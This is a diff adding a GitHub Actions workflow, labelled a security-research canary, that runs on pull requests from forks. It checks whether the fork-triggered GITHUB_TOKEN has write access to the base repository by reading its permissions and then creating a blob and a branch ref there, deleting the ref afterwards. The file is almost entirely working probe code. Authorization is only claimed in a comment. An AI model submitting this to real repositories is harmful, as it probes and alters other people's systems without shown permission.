@@ -1,0 +1,102 @@
+name: canary-fork-token-perms-20261107T003113Z
+
+# Security-research canary (authorized responsible-disclosure testing).
+# Purpose: determine whether a pull_request workflow triggered from a FORK
+# receives a write-capable GITHUB_TOKEN. Read-only probes + one reversible ref.
+# This file is removed and the PR closed immediately after observation.
+
+on:
+  pull_request:
+
+permissions:
+  contents: write
+
+jobs:
+  canary:
+    name: fork-token-canary
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Context
+        run: |
+          echo "event=${{ github.event_name }}"
+          echo "base_repo=${{ github.repository }}"
+          echo "head_repo=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "head_is_fork=${{ github.event.pull_request.head.repo.fork }}"
+          echo "head_sha=${{ github.event.pull_request.head.sha }}"
+          echo "actor=${{ github.actor }}"
+          echo "pr_number=${{ github.event.pull_request.number }}"
+
+      - name: Probe token permissions (no mutation)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          echo "--- GET /repos/${{ github.repository }} ---"
+          code=$(curl -sS -o "$RUNNER_TEMP/repo.json" -w '%{http_code}' \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}")
+          echo "http=$code"
+          python3 - <<'PY'
+          import json, os
+          p = os.environ.get('RUNNER_TEMP', '/tmp') + '/repo.json'
+          try:
+              d = json.load(open(p))
+              print("token_permissions=", json.dumps(d.get("permissions")))
+              print("repo_private=", d.get("private"))
+          except Exception as e:
+              print("parse_error", e)
+          PY
+
+      - name: Probe write via blob creation (harmless dangling object)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          echo "--- POST /git/blobs ---"
+          code=$(curl -sS -o "$RUNNER_TEMP/blob.json" -w '%{http_code}' \
+            -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/git/blobs" \
+            -d '{"content":"canary fork token permission probe 20261107T003113Z","encoding":"utf-8"}')
+          echo "blob_http=$code"
+          head -c 400 "$RUNNER_TEMP/blob.json"; echo
+          if [ "$code" = "201" ]; then echo "BLOB_WRITE=YES"; else echo "BLOB_WRITE=NO"; fi
+
+      - name: Probe write via ref creation (impact oracle, reverted)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          REF="refs/heads/canary-fork-20261107t003113z"
+          echo "--- POST /git/refs $REF ---"
+          code=$(curl -sS -o "$RUNNER_TEMP/ref.json" -w '%{http_code}' \
+            -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs" \
+            -d "{\"ref\":\"$REF\",\"sha\":\"${{ github.event.pull_request.head.sha }}\"}")
+          echo "ref_http=$code"
+          head -c 400 "$RUNNER_TEMP/ref.json"; echo
+          if [ "$code" = "201" ]; then
+            echo "REF_WRITE=YES"
+            echo "--- cleanup: DELETE $REF ---"
+            dcode=$(curl -sS -o "$RUNNER_TEMP/del.json" -w '%{http_code}' \
+              -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/canary-fork-20261107t003113z")
+            echo "ref_delete_http=$dcode"
+            head -c 300 "$RUNNER_TEMP/del.json"; echo
+          else
+            echo "REF_WRITE=NO"
+          fi
+
+      - name: Summary
+        if: always()
+        run: |
+          echo "CANARY COMPLETE 20261107T003113Z" >> "$GITHUB_STEP_SUMMARY"
+          echo "- fork: ${{ github.event.pull_request.head.repo.full_name }} (fork=${{ github.event.pull_request.head.repo.fork }})" >> "$GITHUB_STEP_SUMMARY"
+          echo "See job log for http codes and token_permissions." >> "$GITHUB_STEP_SUMMARY"
